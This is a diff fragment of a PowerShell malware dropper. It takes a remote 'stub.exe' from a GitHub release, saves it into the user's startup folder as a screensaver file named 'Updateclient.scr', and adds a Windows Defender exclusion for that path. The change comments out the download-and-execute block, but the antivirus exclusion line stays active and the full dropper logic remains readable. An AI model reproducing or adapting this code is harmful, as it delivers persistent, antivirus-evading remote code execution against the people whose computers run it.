@@ -19,10 +19,10 @@ $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
 Add-MpPreference -ExclusionPath $output
 
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
-    Write-Host "Tệp đã được tải về thành công."
-}
+# if (Test-Path -Path $output) {
+#     Write-Host "hello"
+# } else {
+#     Invoke-WebRequest -Uri $url -OutFile $output
+#     Start-Process $output
+#     Write-Host "Tệp đã được tải về thành công."
+# }
